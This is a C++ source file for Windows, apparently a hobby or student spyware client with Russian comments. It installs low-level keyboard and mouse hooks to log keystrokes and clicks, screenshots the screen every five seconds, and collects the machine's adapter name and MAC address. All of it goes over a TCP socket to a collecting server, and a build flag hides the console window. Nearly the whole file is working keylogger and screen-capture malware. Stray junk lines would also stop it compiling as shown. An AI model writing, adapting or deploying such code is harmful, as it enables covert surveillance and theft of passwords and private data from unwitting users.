
// g++ client.cpp -o client  -lws2_32 -lgdiplus -mwindows -liphlpapi

/* mwindows
 устанавливает точку входа в WinMain (или wWinMain ) вместо main
 (или wmain ), что приводит к отсутствию окна консоли и запуску некоторого кода
  запуска Win32 для создания аргументов, переданных в WinMain .
*/

#include <string>
#include <winsock2.h>
#include <time.h>
#include <sys/time.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <io.h>
#include <cstdio>
#include <fcntl.h>
#include <gdiplus.h>
#include <iphlpapi.h>

using namespace std;
using namespace Gdiplus;

#define PORT 666
#define SERVERADDR "127.0.0.1"
#define SIZE 100
#define NSEC 5
1234567890-qweqwewerwerwerwerwer
привет
SOCKET my_sock;

HHOOK keyboardHook;
HHOOK mouseHook;

char send_key_text[SIZE];
int index = 0;
bool isEnter = false;

char mouse_coords[SIZE];
bool isMouse = false;

void get_image();
double wtime() {
	struct timeval t;
	gettimeofday(&t, NULL);
	return (double)t.tv_sec + (double)t.tv_usec * 1E-6;
}

static int send_image(){

	get_image();

	char message_type[] = "img\0";
	send(my_sock, message_type, sizeof(message_type), 0);

	int n = 0;
	int siz = 0;
	FILE *picture;
	char buf[50];
	char *s = NULL;

	cout << "Getting image size" << endl;
	picture = fopen("tmp/screen.png", "rb");
	if (picture == NULL) {
		cout << "Fopen error" << endl;
		return -1;
	}
	fseek(picture, 0, SEEK_END);
	siz = ftell(picture);
	cout << siz << endl;

	cout << "Sending picture size to the server" << endl;
	sprintf(buf, "%d", siz);
	if((n = send(my_sock, buf, sizeof(buf), 0)) < 0) {
		cout << "send_size()" << endl;
		return -1;
	}

	cout << buf << "\t" << "Bytes send: "  << n << endl;

	char Sbuf[siz];
	cout << "Sending the picture as byte array" << endl;
	fseek(picture, 0, SEEK_SET);

	while(!feof(picture)) {
		fread(Sbuf, sizeof(char), sizeof(Sbuf), picture);
		if((n = send(my_sock, Sbuf, sizeof(Sbuf), 0)) < 0) {
			cout << "send_size()" << endl;
			return -1;
		}
		cout << "Bytes send: "  << n << endl;
		if (n == siz) {
			break;
		}
		memset(Sbuf, 0, sizeof(Sbuf));
	}
	return 0;
}

void get_image() {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC scrdc, memdc;
    HBITMAP membit;

    scrdc = GetDC(0);

    int Height, Width;
    Height = GetSystemMetrics(SM_CYSCREEN);
    Width = GetSystemMetrics(SM_CXSCREEN);

    memdc = CreateCompatibleDC(scrdc);
    membit = CreateCompatibleBitmap(scrdc, Width, Height);
    SelectObject(memdc, membit);

    BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
    HBITMAP hBitmap;
    hBitmap = (HBITMAP)SelectObject(memdc, membit);
    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    GUID png =
    { 0x557cf406, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };
    bitmap.Save(L"tmp/screen.png", &png, NULL);
    DeleteObject(hBitmap);
}

int toAscii(UINT VkCode) {
    BYTE btKeyState[256];
    DWORD ProcessId;
    // Раскладка
    HKL hklLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), &ProcessId));
    WORD ch;
    for (int i= 0; i < 256; ++i) {
        btKeyState[i] = GetKeyState(i);
    }

    if ((ToAsciiEx(VkCode, MapVirtualKey(VkCode, 0), btKeyState, &ch, 0, hklLayout) == 1) && GetKeyState(VK_CONTROL) >= 0 && GetKeyState(VK_MENU) >= 0) {
        return ch;
    }

    return -1;
}

LRESULT CALLBACK LLMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(mouseHook, nCode, wParam, lParam);
    }
    MOUSEHOOKSTRUCT* pMouseStruct = (MOUSEHOOKSTRUCT*)lParam;

    if (pMouseStruct != NULL) {
        switch (wParam) {
            case WM_LBUTTONDOWN:
                isMouse = true;
                sprintf(mouse_coords, "%s: %d %d\n", "Left click\0", pMouseStruct->pt.x, pMouseStruct->pt.y);

                cout << "Left click: "  << pMouseStruct->pt.x << " " << pMouseStruct->pt.y << endl;
                break;
            case WM_RBUTTONDOWN:
                isMouse = true;
                sprintf(mouse_coords, "%s: %d %d\n", "Right click\0", pMouseStruct->pt.x, pMouseStruct->pt.y);

                cout << "Right click: "  << pMouseStruct->pt.x << " " << pMouseStruct->pt.y << endl;
                break;
        }
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LLKeyProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode < 0) {
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }

    BYTE btKeyState[256];
    for (int i= 0; i < 256; ++i){
        btKeyState[i] = GetKeyState(i);
    }

    if(nCode == HC_ACTION && wParam == WM_KEYUP) {
        DWORD vk = ((LPKBDLLHOOKSTRUCT)lParam)->vkCode;
        switch(vk) {
            case VK_SPACE:
                send_key_text[index++] = ' ';
                break;
            case VK_BACK:
                strcat(send_key_text, "<b>\0");
                index += 3;
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                strcat(send_key_text, "<s>\0");
                index += 3;
    			break;
    		case VK_CAPITAL:
    			break;
    		case VK_CONTROL:
                strcat(send_key_text, "<c>\0");
                index += 3;
    			break;
    		case VK_RETURN:
                isEnter = true;
    			send_key_text[index++] = '\n';
    			break;
            case VK_ESCAPE:
                strcat(send_key_text, "<e>\0");
                index += 3;
                break;
            default:
                char check = toAscii(vk);
                if ((int)check != -1) {
                    send_key_text[index++] = check;
                }
                break;
        }
        if (index == SIZE - 1) {
            isEnter = true;
        }
        cout << send_key_text << endl;
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main(int argc, char* argv[]) {
	if (AllocConsole()) {
        freopen("CONOUT$", "w", stdout);
        SetConsoleTitle("debug");
		// setlocale(LC_ALL,"Russian");
		// setlocale(LC_CTYPE, "rus");
		SetConsoleOutputCP(1251);
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_RED);
    }

	HANDLE handle_out = GetStdHandle(STD_OUTPUT_HANDLE);
    int hCrt = _open_osfhandle((long) handle_out, _O_TEXT);
    FILE* hf_out = _fdopen(hCrt, "w");
    setvbuf(hf_out, NULL, _IONBF, 1);
    *stdout = *hf_out;

    cout << "BIG BROTHER IS WATCHING YOU" << endl;
	// cout << system("ipconfig /all");
	char buff[1024];

    if (WSAStartup(0x202, (WSADATA *)&buff[0])) {
        cout << "WSAStart error: " << WSAGetLastError() << endl;
        return -1;
    }

    // создание сокета
    my_sock = socket(AF_INET,SOCK_STREAM,0);
    if (my_sock < 0) {
        cout << "Socket() erro: " << WSAGetLastError() << endl;
        return -1;
    }

    // установка соединения
    sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(PORT);
    HOSTENT *hst;
    // преобразование IP адреса из символьного в сетевой формат
    if (inet_addr(SERVERADDR) != INADDR_NONE) {
        dest_addr.sin_addr.s_addr = inet_addr(SERVERADDR);
    } else {
        // попытка получить IP адрес по доменному имени сервера
        if (hst = gethostbyname(SERVERADDR)) {
            ((unsigned long *)&dest_addr.sin_addr)[0] = ((unsigned long **)hst->h_addr_list)[0][0];
        } else {
            cout << "Invalid address: " << SERVERADDR << endl;
            closesocket(my_sock);
            WSACleanup();
            return -1;
        }
    }

    if (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))) {
        cout << "Connect error: " << WSAGetLastError() << endl;
        return -1;
    }


    /*  HOOKS */
    /*--------------------------------*/

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LLKeyProc, GetModuleHandle(NULL), 0);
    if (!keyboardHook) {
        cout << "Error keyboardHook" << endl;
        return -1;
    }

    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, LLMouseProc, GetModuleHandle(NULL), 0);
    if (!mouseHook) {
        cout << "Error mouseHook" << endl;
        return -1;
    }


	IP_ADAPTER_INFO ip_ainf[128];
	PIP_ADAPTER_INFO pip_ainf = ip_ainf;
	ULONG bufLen = sizeof(ip_ainf);
	GetAdaptersInfo(ip_ainf, &bufLen);

	char client_unic_id[100];
    sprintf(client_unic_id, "%s [%s] MAC: %02X:%02X:%02X:%02X:%02X:%02X\0",
        pip_ainf->AdapterName,
        pip_ainf->Description,
        pip_ainf->Address[0],
        pip_ainf->Address[1],
        pip_ainf->Address[2],
        pip_ainf->Address[3],
        pip_ainf->Address[4],
        pip_ainf->Address[5]
        );

	send(my_sock, client_unic_id, sizeof(client_unic_id), 0);

	char message_type[] = "str\0";
	// send_image();
    SetTimer(0, 0, 1000 * NSEC, (TIMERPROC)send_image);
    while(WaitMessage()) {
        MSG msg = {0};
        while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) > 0) {
            if(msg.message == WM_QUIT) {
                UnhookWindowsHookEx(keyboardHook);
                UnhookWindowsHookEx(mouseHook);

                closesocket(my_sock);
                WSACleanup();

                return 0;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (isEnter) {
			send(my_sock, message_type, sizeof(message_type), 0);

            send(my_sock, send_key_text, sizeof(send_key_text), 0);
            index = 0;
            isEnter = false;
            memset(send_key_text, '\0', sizeof(send_key_text));
        }

        if (isMouse) {
			send(my_sock, message_type, sizeof(message_type), 0);

            send(my_sock, mouse_coords, sizeof(mouse_coords), 0);
            isMouse = false;
            memset(mouse_coords, '\0', sizeof(mouse_coords));
        }
    }

    /*--------------------------------*/

    closesocket(my_sock);
    WSACleanup();

    return -1;
}
